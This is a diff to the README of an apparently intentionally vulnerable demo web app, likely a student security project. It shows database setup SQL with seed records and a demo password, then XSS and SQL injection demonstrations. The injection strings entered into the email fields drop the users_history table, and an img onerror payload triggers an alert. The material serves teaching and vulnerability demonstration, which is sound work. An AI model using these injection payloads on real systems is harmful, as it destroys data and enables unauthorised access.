@@ -28,6 +28,7 @@ Relaunch Google Chrome to apply the changes.
  - SYS_SECURITY_LVL = security state (SAFE/XSS/SQLI)
 
 ### init DataBase:
+```text
 CREATE SCHEMA `secure_network_project` ;
 use `secure_network_project` ;
 CREATE TABLE users (
@@ -59,7 +60,7 @@ insert into users (user_email, user_password, user_salt) values("alonasshlomi@gm
 insert into login_tries (user_email, tries) values("alonasshlomi@gmail.com", 0);
 insert into clients (client_id, client_first_name, client_last_name, client_phone, client_email) values("123456789", "alon", "shlomi","0506666666", "hi@gmail.com");
 insert into clients (client_id, client_first_name, client_last_name, client_phone, client_email) values("123456780", "alon1", "shlomi1","0506666661", "hi1@gmail.com");
-
+```
     --      user email- alonasshlomi@gmail.com     user password- 1234
 
 
@@ -69,25 +70,35 @@ insert into clients (client_id, client_first_name, client_last_name, client_phon
 ### XSS to use in new client Last name on XSS mode
  - Change SYS_SECURITY_LVL=XSS
  - add new client and in the last name insert :
-" <img onerror='alert("Hacked!");' src='invalid-image' /> "
+```text
+<img onerror='alert("Hacked!");' src='invalid-image' /> 
+```
+
  - click on show all clients to show the 'Hack'
 
 ### SQLi to use on login email in SQLI mode to drop table
  - Change SYS_SECURITY_LVL=SQLI
  - login and put in the email: 
-     "s' or 1=1; Drop table users_history; -- "
+```text
+s' or 1=1; Drop table users_history; --  
+```
  - watch users_history dropped in the DataBase
 
 ### SQLi to use on New Client email in SQLI mode to drop table
  - Change SYS_SECURITY_LVL=SQLI
  - add new client and put in the email: 
-     "a' ); Drop table users_history; -- "
+```text
+a' ); Drop table users_history; -- 
+```
  - watch users_history dropped in the DataBase
 
 ### SQLi to use on New User email in SQLI mode to drop table
  - Change SYS_SECURITY_LVL=SQLI
  - add new user and put in the email:
-    "aa'); Drop table users_history; -- "
+```text
+aa'); Drop table users_history; -- 
+```
+
  - watch users_history dropped in the DataBase
 
 
